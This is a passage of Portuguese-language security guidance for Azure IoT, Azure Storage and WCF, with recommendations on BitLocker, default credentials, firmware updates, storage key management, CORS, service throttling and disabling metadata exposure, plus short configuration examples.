| **Etapas** | Não habilite ou desabilite no sistema operacional recursos ou serviços que não sejam necessários ao funcionamento da solução. Por exemplo, se o dispositivo não precisar de uma interface de usuário para ser implantado, instale o Windows IoT Core no modo sem periféricos. |

## <a id="field-bit-locker"></a>Criptografar o sistema operacional e partições adicionais do Gateway de Campo IoT com o BitLocker

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Campo de IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | O Windows 10 IoT Core implementa uma versão leve da Criptografia do dispositivo do BitLocker, que tem uma dependência forte na presença de um TPM na plataforma, incluindo o protocolo preOS necessário na UEFI que realiza as medições necessárias. Essas medições do preOS garantem que o sistema operacional posteriormente tenha um registro definitivo de como ele foi iniciado. Use o BitLocker para criptografar as partições do sistema operacional e outras partições também, caso elas armazenem dados confidenciais. |

## <a id="default-change"></a>Garantir que as credenciais de logon padrão do gateway de campo sejam alteradas durante a instalação

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Campo de IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Garanta que as credenciais de logon padrão do gateway de campo sejam alteradas durante a instalação. |

## <a id="cloud-firmware"></a>Garantir que o Gateway de Nuvem implemente um processo para manter atualizado o firmware de dispositivos conectados

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Nuvem IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Opção de gateway - Hub IoT do Azure |
| **Referências**              | [Visão geral do gerenciamento de dispositivos do Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Como atualizar o firmware do dispositivo](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Etapas** | O LWM2M é um protocolo da Open Mobile Alliance destinado ao gerenciamento de dispositivos IoT. O gerenciamento de dispositivos IoT do Azure permite que você interaja com dispositivos físicos usando os trabalhos do dispositivo. Certifique-se de que o Gateway de Nuvem implemente um processo para manter constantemente atualizados o dispositivo e outros dados de configuração usando o gerenciamento de dispositivos do Hub IoT do Azure. |

## <a id="controls-policies"></a>Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de confiança de máquina | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Certifique-se de que os dispositivos tenham controles de segurança de ponto de extremidade, como o BitLocker, para criptografia no nível do disco, um antivírus com assinaturas atualizadas, um firewall baseado em host, atualizações de sistema operacional, políticas de grupo, etc., e que eles estejam configurados de acordo com as políticas de segurança organizacionais. |

## <a id="secure-keys"></a>Garantir o gerenciamento seguro das chaves de acesso do Armazenamento do Azure

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Guia de segurança do Armazenamento do Azure - Gerenciando as chaves da conta de armazenamento](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Etapas** | <p>Armazenamento de chave: recomenda-se armazenar as chaves de acesso do Armazenamento do Azure como um segredo no Azure Key Vault e solicitar que os aplicativos recuperem a chave diretamente do cofre de chaves. Recomendamos que você faça isso pelos seguintes motivos:</p><ul><li>O aplicativo nunca adicionará a chave de armazenamento ao código de um arquivo de configuração, o que remove a possibilidade de alguém obter acesso às chaves sem uma permissão específica.</li><li>O acesso às chaves pode ser controlado com o Azure Active Directory. Isso significa que um proprietário de conta pode conceder acesso a diversos aplicativos que precisam recuperar as chaves do Azure Key Vault. Outros aplicativos não poderão acessar as chaves sem que recebam uma permissão específica para isso.</li><li>Regeneração de chave: por motivos de segurança, recomendamos que você implante um processo para regenerar chaves de acesso no Armazenamento do Azure. Para obter informações detalhadas sobre por que e como planejar a regeneração de chaves, consulte o arquivo mencionado na seção Referência, incluído no Guia de segurança do Armazenamento do Azure.</li></ul>|

## <a id="cors-storage"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado no Armazenamento do Azure

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Suporte ao CORS para os serviços de armazenamento do Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Etapas** | O Armazenamento do Azure permite habilitar o CORS – Compartilhamento de Recursos entre Origens. Para cada conta de armazenamento, é possível especificar os domínios que podem acessar os recursos na conta de armazenamento. Por padrão, o CORS está desabilitado em todos os serviços Você pode habilitar o CORS usando a API REST ou a biblioteca de cliente de armazenamento para chamar um dos métodos e definir as políticas de serviço. |

## <a id="throttling"></a>Habilitar o recurso de limitação do serviço WCF

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Etapas** | <p>Não definir um limite para o uso de recursos do sistema pode resultar no esgotamento de recursos e, por fim, em uma negação de serviço.</p><ul><li>**EXPLICAÇÃO:** o Windows Communication Foundation (WCF) oferece a opção de restringir as solicitações de serviço. Permitir muitas solicitações de clientes pode sobrecarregar o sistema e esgotar seus recursos. Por outro lado, permitir apenas um pequeno número de solicitações para um serviço pode impedir usuários legítimos de usar o serviço. Cada serviço deve ser ajustado e configurado individualmente para permitir a quantidade apropriada de recursos.</li><li>**RECOMENDAÇÕES** Habilite o recurso de limitação de serviços do WCF e defina os limites apropriados para o aplicativo.</li></ul>|

### <a name="example"></a>Exemplo
Veja abaixo um exemplo de configuração com a limitação habilitada:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Divulgação de informações do WCF por meio de metadados

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Etapas** | Os metadados podem ajudar invasores a obter mais informações sobre o sistema e a planejar uma forma de ataque. Os serviços do WCF podem ser configurados para expor os metadados, que fornecem informações descritivas detalhadas do serviço e que não devem ser transmitidos em ambientes de produção. As propriedades `HttpGetEnabled` / `HttpsGetEnabled` da classe ServiceMetaData definem se um serviço deve expor os metadados. | 

### <a name="example"></a>Exemplo
O código mostrado abaixo instrui o WCF a transmitir os metadados de um serviço.
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não transmita os metadados de um serviço em um ambiente de produção. Defina as propriedades HttpGetEnabled / HttpsGetEnabled da classe ServiceMetaData classe como false. 

### <a name="example"></a>Exemplo
O código mostrado abaixo instrui o WCF a não transmitir os metadados de um serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
